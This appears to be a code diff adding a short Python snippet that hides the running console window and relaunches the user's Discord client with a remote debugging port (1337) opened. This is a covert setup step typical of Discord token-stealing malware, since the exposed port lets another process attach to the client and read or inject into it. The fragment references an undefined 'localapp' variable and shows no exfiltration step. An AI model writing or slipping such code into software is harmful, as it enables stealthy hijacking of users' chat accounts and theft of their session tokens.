@@ -1,0 +1,7 @@
+import os
+import win32gui, win32con
+
+
+hide = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(hide , win32con.SW_HIDE)
+os.system(rf"{localapp}\Discord/app-1.0.9007\Discord.exe  --remote-debugging-port=1337")
